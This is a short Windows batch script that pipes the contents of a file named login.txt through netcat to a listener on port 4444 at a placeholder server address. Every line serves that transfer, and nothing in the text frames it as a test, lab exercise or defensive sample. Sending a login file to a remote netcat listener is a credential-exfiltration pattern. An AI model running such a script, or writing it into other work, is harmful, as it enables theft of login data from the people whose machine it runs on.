@echo off
set SERVER_IP=your_server_ip_address

echo Sending data from login.txt to netcat listener...
type login.txt | nc %SERVER_IP% 4444
echo Data sent.
pause